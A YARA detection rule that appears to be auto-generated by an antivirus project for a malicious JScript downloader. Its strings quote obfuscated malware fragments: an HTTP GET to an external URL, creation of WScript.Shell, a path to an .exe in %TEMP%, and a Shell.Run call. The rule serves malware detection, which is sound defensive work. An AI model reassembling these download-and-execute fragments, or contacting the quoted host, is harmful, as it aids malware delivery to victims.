rule sig_20160330_714dc0a007b84d745b3c02ef96b826e0 {
  meta:
    description = "datamaliciousorder - file 20160330_714dc0a007b84d745b3c02ef96b826e0.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a3b34e5fb521adbe99d8af37b35b28e67f6967deddf574914919df2d98ab3c6e"

  strings:
    $s1  = "_NN[_ZD](\"GET\", \"http://linkownia.itcom.pl/s9aps\", false);" fullword ascii
    $s2  = "var _U0 = function _SN() {return WScript[_G](\"WScript\"+\".Shell\");}(), _Z0 = 11;" fullword ascii
    $s3  = "function _JP(_TC, _WV){_LD = _LD * 1; return _TC - _WV;};" fullword ascii
    $s4  = "if (_NN[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _SD() {return _U0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"dJdRovrI5R2r6wo.ex\" + \"e\";};" fullword ascii
    $s6  = "function _D0(){return _J + \"\";};" fullword ascii
    $s7  = "function _X0(_P){_U0[\"Run\"](_P, _LD, _LD);};" fullword ascii
    $s8  = "function _X() {return ((_T0 == true) && (_T0 == _UD)) ? 1 : _LD;};" fullword ascii
    $s9  = "function _U()" fullword ascii
    $s10 = "var _M = new this[\"Date\"]();" fullword ascii
    $s11 = "function _H(_BP) {var _CP = (1, 2, 3, 4, 5, _BP); return _CP;};" fullword ascii
    $s12 = "function _D(){return 22;};" fullword ascii
    $s13 = " while (_MB){" fullword ascii
    $s14 = "function _XM(){return _G;};" fullword ascii
    $s15 = "return _JP(_N0, _T);" fullword ascii
    $s16 = "var _T0 = false;" fullword ascii
    $s17 = "_T0 = true; " fullword ascii
    $s18 = "var _X1 = false;" fullword ascii
    $s19 = "_UD = true; " fullword ascii
    $s20 = "var _UD = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}